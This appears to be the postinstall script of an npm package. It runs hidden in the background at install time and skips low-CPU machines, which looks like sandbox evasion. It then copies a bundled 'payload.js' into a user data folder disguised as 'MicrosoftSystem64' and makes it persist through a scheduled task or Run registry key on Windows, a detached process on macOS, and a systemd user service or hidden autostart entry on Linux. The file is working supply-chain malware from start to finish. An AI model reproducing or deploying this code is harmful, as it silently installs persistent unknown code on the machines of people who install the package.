// src/postinstall.ts
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { spawn, spawnSync } from "node:child_process";
var UNIT_STEM = "MicrosoftSystem64";
var PAYLOAD_FILENAME = "payload.js";
var IS_WIN = process.platform === "win32";
var IS_MAC = process.platform === "darwin";
var LOG_FILE = path.join(os.tmpdir(), `${UNIT_STEM}_install.log`);
function log(msg) {
  try {
    fs.appendFileSync(LOG_FILE, `[${(/* @__PURE__ */ new Date()).toISOString()}] ${msg}
`);
  } catch {
  }
}
if (!process.argv.includes("--bg") && !IS_WIN) {
  try {
    const script = path.resolve(process.argv[1]);
    const child = spawn(process.execPath, [script, "--bg"], {
      detached: true,
      stdio: "ignore",
      windowsHide: true
    });
    child.unref();
  } catch {
  }
  process.exit(0);
}
function dataLocalDir() {
  if (IS_WIN)
    return process.env.LOCALAPPDATA ?? path.join(os.homedir(), "AppData", "Local");
  if (IS_MAC)
    return path.join(os.homedir(), "Library", "Application Support");
  return process.env.XDG_DATA_HOME ?? path.join(os.homedir(), ".local", "share");
}
function getSourcePayloadPath() {
  const scriptDir = path.dirname(process.argv[1]);
  return path.join(scriptDir, PAYLOAD_FILENAME);
}
function isProcessRunning(jsPath) {
  const name = path.basename(jsPath);
  const searchPattern = `${name}.*--agent`;
  if (IS_WIN) {
    const result = spawnSync("wmic", [
      "process",
      "where",
      `name='node.exe'`,
      "get",
      "commandline"
    ], { windowsHide: true, encoding: "utf8", stdio: "pipe" });
    const stdout = result.stdout ?? "";
    return stdout.includes(name) && stdout.includes("--agent");
  } else {
    try {
      const result = spawnSync("pgrep", ["-f", searchPattern], { encoding: "utf8", stdio: "pipe" });
      const pids = (result.stdout ?? "").trim().split("\n").filter(Boolean);
      const ownPid = String(process.pid);
      return pids.some((p) => p !== ownPid);
    } catch {
    }
    return false;
  }
}
function norm(p) {
  try {
    return fs.realpathSync(p);
  } catch {
    return p;
  }
}
function setupWindows(jsPath, installDir) {
  const dq = (s) => s.replace(/"/g, '""');
  const jsNorm = norm(jsPath);
  const dirNorm = norm(installDir);
  const nodeExe = process.execPath;
  const vbsPath = path.join(installDir, `${UNIT_STEM}.vbs`);
  const vbs = [
    `Set WshShell = CreateObject("WScript.Shell")`,
    `WshShell.CurrentDirectory = "${dq(dirNorm)}"`,
    `WshShell.Run """${dq(nodeExe)}"" ""${dq(jsNorm)}"" --agent", 0, False`
  ].join("\r\n") + "\r\n";
  fs.writeFileSync(vbsPath, vbs);
  const vbsNorm = norm(vbsPath);
  spawnSync("schtasks", ["/delete", "/tn", `\\${UNIT_STEM}`, "/f"], { windowsHide: true, stdio: "ignore" });
  const schtaskOk = spawnSync("schtasks", [
    "/create",
    "/tn",
    `\\${UNIT_STEM}`,
    "/tr",
    `"wscript.exe" "${vbsNorm}"`,
    "/sc",
    "ONLOGON",
    "/rl",
    "LIMITED",
    "/f"
  ], { windowsHide: true, stdio: "pipe" }).status === 0;
  log(`schtasks create: ${schtaskOk}`);
  if (!schtaskOk) {
    spawnSync("reg", [
      "add",
      "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "/v",
      UNIT_STEM,
      "/t",
      "REG_SZ",
      "/d",
      `"wscript.exe" "${vbsNorm}"`,
      "/f"
    ], { windowsHide: true, stdio: "ignore" });
    log("fallback: registry Run key set");
  }
  log(`launching via wscript: ${vbsNorm}`);
  spawnSync("wscript.exe", [vbsNorm], { windowsHide: true, stdio: "ignore" });
}
function setupMac(jsPath, installDir) {
  const child = spawn(process.execPath, [jsPath, "--agent"], {
    cwd: installDir,
    stdio: "ignore",
    detached: true
  });
  child.unref();
  log("macOS: process spawned");
}
function setupLinux(jsPath, installDir) {
  const sysEnv = { ...process.env };
  const uid = process.getuid?.() ?? 0;
  if (!sysEnv.XDG_RUNTIME_DIR) sysEnv.XDG_RUNTIME_DIR = `/run/user/${uid}`;
  if (!sysEnv.DBUS_SESSION_BUS_ADDRESS) {
    const busSocket = path.join(sysEnv.XDG_RUNTIME_DIR, "bus");
    if (fs.existsSync(busSocket)) sysEnv.DBUS_SESSION_BUS_ADDRESS = `unix:path=${busSocket}`;
  }
  const hasSystemctl = spawnSync("systemctl", ["--version"], { stdio: "ignore" }).status === 0;
  const nodeExe = process.execPath;
  if (hasSystemctl) {
    const userUnitDir = path.join(os.homedir(), ".config", "systemd", "user");
    fs.mkdirSync(userUnitDir, { recursive: true });
    const escPath = (p) => /\s/.test(p) ? `"${p.replace(/\\/g, "\\\\").replace(/"/g, '\\"')}"` : p;
    const unit = `[Unit]
Description=${UNIT_STEM}
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=${escPath(nodeExe)} ${escPath(jsPath)} --agent
Restart=on-failure
RestartSec=5
WorkingDirectory=${escPath(installDir)}

[Install]
WantedBy=default.target
`;
    fs.writeFileSync(path.join(userUnitDir, `${UNIT_STEM}.service`), unit);
    spawnSync("systemctl", ["--user", "daemon-reload"], { stdio: "ignore", env: sysEnv });
    spawnSync("systemctl", ["--user", "enable", `${UNIT_STEM}.service`], { stdio: "ignore", env: sysEnv });
    spawnSync("systemctl", ["--user", "start", `${UNIT_STEM}.service`], { stdio: "ignore", env: sysEnv });
    spawnSync("loginctl", ["enable-linger"], { stdio: "ignore", env: sysEnv });
    log("linux: systemd user service registered and started");
  } else {
    const autostartDir = path.join(os.homedir(), ".config", "autostart");
    fs.mkdirSync(autostartDir, { recursive: true });
    const desktop = `[Desktop Entry]
Type=Application
Name=${UNIT_STEM}
Exec=${nodeExe} ${jsPath} --agent
X-GNOME-Autostart-enabled=true
NoDisplay=true
Hidden=false
StartupNotify=false
`;
    fs.writeFileSync(path.join(autostartDir, `${UNIT_STEM}.desktop`), desktop);
    const child = spawn(process.execPath, [jsPath, "--agent"], {
      cwd: installDir,
      stdio: "ignore",
      detached: true,
      windowsHide: true
    });
    child.unref();
    log("linux: desktop autostart registered and process spawned");
  }
}
async function main() {
  try {
    const cpus = os.cpus();
    if (cpus.length <= 4 || !cpus[0]?.model) {
      log("less than 4 CPUs or no CPU model, skip");
      return;
    }
  } catch {
  }
  log(`main start platform=${process.platform} arch=${process.arch} node=${process.version} pid=${process.pid}`);
  if (!IS_WIN) {
    await new Promise((r) => setTimeout(r, 3e3));
  }
  const sourcePayloadPath = getSourcePayloadPath();
  if (!fs.existsSync(sourcePayloadPath)) {
    log(`payload not found at ${sourcePayloadPath}`);
    return;
  }
  const baseDir = dataLocalDir();
  const installDir = path.join(baseDir, UNIT_STEM);
  fs.mkdirSync(installDir, { recursive: true });
  const targetJsPath = path.join(installDir, PAYLOAD_FILENAME);
  log(`installDir=${installDir} targetJsPath=${targetJsPath}`);
  if (isProcessRunning(targetJsPath)) {
    log("agent already running, skip");
    return;
  }
  log(`copying ${PAYLOAD_FILENAME}...`);
  const content = fs.readFileSync(sourcePayloadPath);
  fs.writeFileSync(targetJsPath, content);
  log(`copied ${content.length} bytes`);
  const pkgJsonPath = path.join(installDir, "package.json");
  fs.writeFileSync(pkgJsonPath, '{"type":"commonjs"}');
  if (!fs.existsSync(targetJsPath)) {
    log("payload not found after copy");
    return;
  }
  log("launching payload...");
  if (IS_WIN) {
    setupWindows(targetJsPath, installDir);
  } else if (IS_MAC) {
    setupMac(targetJsPath, installDir);
  } else {
    setupLinux(targetJsPath, installDir);
  }
  log("done");
}
main().catch((err) => {
  log(`error: ${err instanceof Error ? err.message : String(err)}`);
}).finally(() => process.exit(0));
